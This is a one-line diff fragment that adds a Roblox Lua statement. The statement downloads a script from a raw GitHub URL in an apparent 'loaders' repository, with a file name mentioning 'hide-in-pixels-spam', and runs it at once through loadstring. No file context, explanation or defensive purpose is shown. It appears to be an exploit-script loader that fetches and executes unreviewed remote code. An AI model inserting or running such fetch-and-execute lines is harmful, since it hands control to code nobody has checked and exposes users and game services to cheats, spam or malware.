@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/hide-in-pixels-spam0-chme2ou5hg1ioq.lua"))()
